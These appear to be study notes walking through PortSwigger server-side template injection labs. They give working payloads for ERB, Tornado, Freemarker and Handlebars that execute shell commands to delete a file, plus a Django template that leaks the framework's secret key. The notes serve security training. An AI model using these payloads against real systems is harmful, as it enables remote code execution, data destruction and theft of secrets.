# Server Side template injection

[Portswigger](https://portswigger.net/web-security/server-side-template-injection)

## Methodology

Can inject a series of injectable ssti strings to identify the use of ssti

```
${{<%[%'"}}%\
```

Another attempt would be to inject mathematical syntax for ssti and see possible return, look for `49` or `7777777` in ther response form the below:

```
${7*7}
{{7*7}}
{{7*'7'}}
```

Additional injections to test for:

```
${*comment*}
${"z".join("ab")}
```

More payloads and thoughts on ssti:
[hacktricks ssti](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

## Labs Walkthrough

### Basic server-side template injection

Background:
```
To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 
```

- review a products more details, notice a `GET` using a `message` parameter to render "Unfortunately this product is out of stock"
- in the ERB documentation discover the syntax: `<%= someExpression%>` is used to evaluate an expression and render the result on the page
- use ERB template syntax to test a payload containg a mathematical operation `<%= 7*7 %>`
- URL encode the payload and insert it as the value of the message parameter in the URL `https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>`
- notice the operation executes and you get a `49` on the page, meaning we have ssti
- Further ERB documentation talks about the `system()` command, construct a payload to delete carlos's file:

```
<%= system("rm /home/carlos/morale.txt") %>
```

- URL encode this and send it as the message parameter `https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>`

### Basic server-side template injection (code context)

Background:
```
To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter
```

- login and post a comment on one of the blog posts
- notice that on the "my account" page, you can select whether you want the site to use your full name, first name, or nickname. A POST request sets the value of the parameter `blog-post-author-display` to either user.name, user.first_name or user.nickname
- in burp send the request `POST /my-account/change-blog-post-author-display` to repeater
- in Tornado the template expressions are surrounded with double curly braces, so in repeater notice that you can escape out of the expression and inject arbitrary template syntax as follows `blog-post-author-display=user.name}}{{7*7}}`
- Reload the page containing your test comment and notice the page containing your test comment now says `PeterWiener49}}`
- Tornado does use syntax for executing Python with `{% somePython %}`, and pythong supports the `system()` command
- combine this to create syntax to execute the deletion of carlos's file:

```
{% import os %}
{{os.system('rm /home/carlos/morale.txt')
```
- in repeater inject this payload in where you placed the 7*7 earlier, make sure to url encode it `blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')`
- reload the page containing your comment and the lab completes

### Server-side template injection using documentation

Background:
```
identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r
```

- log in and edit one of the product description templates, notice that this template engine uses the syntax `${someExpression}`
- create your own expression or change one of the others to maybe cause an error, save the template. You get an error saying it is the Freemarker template engine
- Freemarker uses the `new()` built-in which can be dangerous
- inject a payload like so: `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }`

This lab was more about researching and discovering all of these pieces together. albinowax has an exploit for freemarker you can view [here](https://portswigger.net/research/server-side-template-injection)

### Server-side template injection in an unknown language with a documented exploit

Background:
```
identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 
```

- notice that when you try to view more details about the first product a `GET` request uses the message parameter to render "Unfortunately this product is out of stock" on the home page. 
- fuzz this `message` parameter with `${{<%[%'"}}%\`, which the error shows it is using `Handlebars`
- search for a handlebars server side template injection payload, there's one by Zombiehelp54 that looks like this, with it already deleting carlos morale.txt:

```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```

- url encode this exploit and add it as the value of the message parameter in the url as so:

```
https://YOUR-LAB-ID.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```

### Server-side template injection with information disclosure via user-supplied objects

Background:
```
To solve the lab, steal and submit the framework's secret key.

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r
```

- log in and edit one of the product description templates
- change one of the template expressions to something invalid using the fuzz polyglot: `${{<%[%'"}}%\` save and notice the errors hint at a Django framework being used
- Django supports the `debug` tag to help with debugging information
- remove your invalid syntax and enter the following statement `{% debug %}`, save and notice this contains a list of objects and properties we can access from within the template
- study the settigns object in Django documentation and notice that it contains a `SECRET_KEY` propert which has dangerous security implications if known to an attacker
- remove the `{% debug %}` in the template and add this: `{{settings.SECRET_KEY}}`
- submit secret key to finish the lab
